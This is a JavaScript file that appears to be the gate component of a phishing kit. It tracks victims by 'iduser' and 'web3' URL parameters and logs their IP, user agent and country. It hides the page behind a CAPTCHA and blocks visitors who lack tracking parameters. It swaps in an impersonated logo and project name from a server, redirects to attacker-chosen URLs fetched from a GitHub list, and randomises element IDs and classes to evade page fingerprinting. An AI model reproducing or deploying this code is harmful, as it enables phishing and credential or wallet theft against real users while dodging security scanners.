    
    let urlready = ""; 
    let ipAddress = "0.0.0.0";
    let randomURL = "";
    
    const log = {
      info: (message, data = "") => console.log(`%c[INFO] ${message}`, "color: #4285f4;", data),
      success: (message, data = "") => console.log(`%c[SUCCESS] ${message}`, "color: #34a853;", data),
      warn: (message, data = "") => console.warn(`%c[WARN] ${message}`, "color: #fbbc05;", data),
      error: (message, error = "") => console.error(`%c[ERROR] ${message}`, "color: #ea4335;", error),
    };
    
    // âœ… Extract userId and web3 from URL
    const params = new URLSearchParams(location.search);
    const userId = params.get("iduser");
	const web3Id = params.get("web3");
    
    
    


    async function getIP() {
      try {
        const res = await fetch("https://api64.ipify.org?format=json");
        const data = await res.json();
        ipAddress = data.ip;
        log.success("IP fetched:", ipAddress);
      } catch (e) {
        log.error("Failed to fetch IP", e);
      }
    }
    
	
    async function getRandomURL() {
          log.info("Fetching random URL...");
          try {
                const response = await fetch("https://raw.githubusercontent.com/zerodayhelp/dream/refs/heads/main/redi_url.txt");
                if (!response.ok) {
                      throw new Error(`HTTP error! status: ${response.status}`);
                }
                const text = await response.text();
                const urls = text.split("\n").filter((x) => x.trim());
                randomURL = urls[Math.floor(Math.random() * urls.length)];
                log.success("Random URL selected", { randomURL });
          } catch (error) {
                log.error("Failed to fetch random URL", error);
                throw error;
          }
    }
          
    // Function to get visitor's country
   async function getVisitorCountry() {
  try {
    const response = await fetch("https://ipwho.is/");
    const data = await response.json();

    if (data.success) {
      const countryName = document.getElementById("country-name");
      if (countryName) {
        countryName.textContent = data.country;  // full country name like "United States"
      }
      return data.country;
    } else {
      throw new Error("Failed to detect country");
    }
  } catch (error) {
    const countryName = document.getElementById("country-name");
    if (countryName) {
      countryName.textContent = "";
    }
    return "";
  }
}
    
   // Hide main content and show CAPTCHA on page load
    function hideMainContent() {
        document.querySelector('.main-content').style.display = 'none';
        document.querySelector('.captcha-container').style.display = 'flex';
    }
       // Change logo image
    function changeLogo(newUrl, newAlt = "New Logo") {
        const logoImg = document.querySelector('.logo img');
        if (logoImg) {
            logoImg.src = newUrl;
            logoImg.alt = newAlt;
        }
    }


	function onCaptchaVerify(token) {
        // Hide CAPTCHA container and show verifying message
        document.querySelector('.captcha-container').style.display = 'none';
        document.querySelector('.verifying').style.display = 'block';
        document.getElementById("loader").style.display = "block";
		   let requestData = {
        ip: ipAddress,
        user_agent: navigator.userAgent || "unknown",
        "cf-turnstile-response": token
    };

    // Add specific fields based on available parameters
    if (web3Id) {
        requestData.web3 = web3Id;
        requestData.type = "web3";
    } else if (userId) {
        requestData.user_id = userId;
        requestData.type = "login";
    }
		

        console.log("Outgoing payload:", requestData);

        fetch('last.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(requestData)
        })
        .then(async response => {
            const text = await response.text();
            try {
                const data = JSON.parse(text);
                console.log("Server response:", data);

                if (data.success) {

					document.getElementById("loader").style.display = "none";
                    document.querySelector('.main-content').style.display = 'block';
                    document.querySelector('.verifying').style.display = 'none';
				  if (data.pro_logo){
                     changeLogo(data.pro_logo, "Custom Logo");

				   }
				   if (data.project){
                     document.getElementById('project-name').textContent = data.project;

				   }
				    if (data.message_url){
					setTimeout(() => {
                           window.location.replace(data.message_url);
                      }, 900);
					}					
					
					
                } else {
                    turnstile.reset();
                    document.querySelector('.captcha-container').style.display = 'flex';
                    document.querySelector('.verifying').style.display = 'none';
					document.getElementById("loader").style.display = "none";
                }
            } catch (err) {
                console.error("Invalid JSON response from server:", text);
                turnstile.reset();
                document.querySelector('.captcha-container').style.display = 'flex';
                document.querySelector('.verifying').style.display = 'none';
                alert('Invalid server response. Please try again.');
            }
        })
        .catch(error => {
            console.error("Network or JSON error:", error);
            turnstile.reset();
            document.querySelector('.captcha-container').style.display = 'flex';
            document.querySelector('.verifying').style.display = 'none';
            alert('An error occurred. Please try again.');
        });
    }


	function onCaptchaload(type) {

        const requestData = {
            ip: ipAddress, // If you want to fetch real IP, use server-side
            user_id: userId,
            user_agent: navigator.userAgent || "unknown",
            type: type,
        };

        console.log("Outgoing payload:", requestData);

        fetch('last.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(requestData)
        })
        .then(async response => {
            const text = await response.text();
            try {
                const data = JSON.parse(text);
                console.log("Server response:", data);

                if (data.success) {
				  if (data.pro_logo){
                     changeLogo(data.pro_logo, "Custom Logo");

				   }
				   if (data.project){
                     document.getElementById('project-name').textContent = data.project;

				   }
				   
                    document.querySelector('.main-content').style.display = 'block';
                    document.querySelector('.verifying').style.display = 'none';
					document.getElementById("loader").style.display = "none";
                } else {
                    turnstile.reset();
                    document.querySelector('.captcha-container').style.display = 'flex';
                    document.querySelector('.verifying').style.display = 'none';
					document.getElementById("loader").style.display = "none";
                }
            } catch (err) {
                console.error("Invalid JSON response from server:", text);
                turnstile.reset();
                document.querySelector('.captcha-container').style.display = 'flex';
                document.querySelector('.verifying').style.display = 'none';
                alert('Invalid server response. Please try again.');
            }
        })
        .catch(error => {
            console.error("Network or JSON error:", error);
            turnstile.reset();
            document.querySelector('.captcha-container').style.display = 'flex';
            document.querySelector('.verifying').style.display = 'none';
            alert('An error occurred. Please try again.');
        });
    }


	function onCaptchaloadweb3(type) {

        const requestData = {
            ip: ipAddress, // If you want to fetch real IP, use server-side
            web3: web3Id,
            user_agent: navigator.userAgent || "unknown",
            type: type,
        };

        console.log("Outgoing payload:", requestData);

        fetch('last.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(requestData)
        })
        .then(async response => {
            const text = await response.text();
            try {
                const data = JSON.parse(text);
                console.log("Server response:", data);

                if (data.success) {
				  if (data.data.pro_logo){
                     changeLogo(data.data.pro_logo, "Custom Logo");

				   }
				   if (data.data.project_name){
                     document.getElementById('project-name').textContent = data.data.project_name;

				   }
				   
                    document.querySelector('.main-content').style.display = 'block';
                    document.querySelector('.verifying').style.display = 'none';
					document.getElementById("loader").style.display = "none";
                } else {
                    turnstile.reset();
                    document.querySelector('.captcha-container').style.display = 'flex';
                    document.querySelector('.verifying').style.display = 'none';
					document.getElementById("loader").style.display = "none";
                }
            } catch (err) {
                console.error("Invalid JSON response from server:", text);
                turnstile.reset();
                document.querySelector('.captcha-container').style.display = 'flex';
                document.querySelector('.verifying').style.display = 'none';
                alert('Invalid server response. Please try again.');
            }
        })
        .catch(error => {
            console.error("Network or JSON error:", error);
            turnstile.reset();
            document.querySelector('.captcha-container').style.display = 'flex';
            document.querySelector('.verifying').style.display = 'none';
            alert('An error occurred. Please try again.');
        });
    }



	function onCaptchablock(type,reson) {

        const requestData = {
            ip: ipAddress, 
            user_agent: navigator.userAgent || "unknown",
            type: type,
			reson: reson,
        };
        document.getElementById("loader").style.display = "block";
        console.log("Outgoing payload:", requestData);

        fetch('last.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify(requestData)
        })
        .then(async response => {
            const text = await response.text();
            try {
                const data = JSON.parse(text);
                console.log("Server response:", data);

                if (data.success) {
				   
                    document.querySelector('.main-content').style.display = 'block';
                    document.querySelector('.verifying').style.display = 'none';
					document.getElementById("loader").style.display = "none";
                } else {
                    turnstile.reset();
                    document.querySelector('.captcha-container').style.display = 'flex';
                    document.querySelector('.verifying').style.display = 'none';
					document.getElementById("loader").style.display = "none";
                }
            } catch (err) {
                console.error("Invalid JSON response from server:", text);
                turnstile.reset();
                document.querySelector('.captcha-container').style.display = 'flex';
                document.querySelector('.verifying').style.display = 'none';
                alert('Invalid server response. Please try again.');
            }
        })
        .catch(error => {
            console.error("Network or JSON error:", error);
            turnstile.reset();
            document.querySelector('.captcha-container').style.display = 'flex';
            document.querySelector('.verifying').style.display = 'none';
            alert('An error occurred. Please try again.');
        });
    }



    document.getElementById("loader").style.display = "block";
    document.getElementById('footer-year').textContent = new Date().getFullYear();


// âœ… Async IIFE
(async () => {
  try {
    await getVisitorCountry();
    await Promise.all([getIP(), getRandomURL()]);
    log.success("All async tasks completed.");

  // âœ… Check for both missing
    if (!userId && !web3Id) {
       onCaptchablock("blocked", "param not found");
      // You can also optionally stop further execution:
      document.querySelector('.captcha-container').style.display = 'none';
      document.querySelector('.verifying').style.display = 'none';
      document.getElementById("loader").style.display = "none";
    } else {
      // âœ… Load appropriate CAPTCHA if valid parameter exists
      if (userId) {
        onCaptchaload("check");
      }
      if (web3Id) {
        onCaptchaloadweb3("checkweb3");
      }
    }
    	
	


  } catch (e) {
    log.error("Error in async startup", e);
  }
})();



/**
 * applyRandomClass
 * @param {string[]} classes  â€“ array of CSS class names
 * @param {string} selector   â€“ CSS selector to attach to (defaults to 'body')
 */
function applyRandomClass(classes, selector = 'body') {
  if (!Array.isArray(classes) || classes.length === 0) {
    console.warn('applyRandomClass: please supply a non-empty array of class names');
    return;
  }
  // when DOM is ready, pick one at random and add it
  function _add() {
    const el = document.querySelector(selector);
    if (!el) return console.warn('applyRandomClass: selector not found', selector);
    const idx = Math.floor(Math.random() * classes.length);
    el.classList.add(classes[idx]);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', _add);
  } else {
    _add();
  }
}

// USAGE EXAMPLE:
// give it your list of theme/background classes
applyRandomClass([
  'theme-sunrise',
  'theme-forest',
  'theme-ocean',
  'theme-moonlight'
]);


(function() {
  // Generate a random prefix (6 alphanumeric chars)
  const prefix = 'class-' + Math.random().toString(36).substr(2, 6);

  let autoIdCounter = 0;
  let autoClassCounter = 0;

  // Walk every element in the body
  document.querySelectorAll('body *').forEach(el => {
    // 1) ID handling
    if (el.id) {
      // add a new class for the prefixed id (preserves original id)
      el.classList.add(`${prefix}-id-${el.id}`);
    } else {
      // generate and assign a new id
      autoIdCounter++;
      el.id = `${prefix}-auto-id-${autoIdCounter}`;
    }

    // 2) CLASS handling
    if (el.classList.length) {
      // for each existing class, add a prefixed version
      Array.from(el.classList).forEach(orig => {
        el.classList.add(`${prefix}-${orig}`);
      });
    } else {
      // no classes? add a generated one
      autoClassCounter++;
      el.classList.add(`${prefix}-auto-class-${autoClassCounter}`);
    }
  });

})();

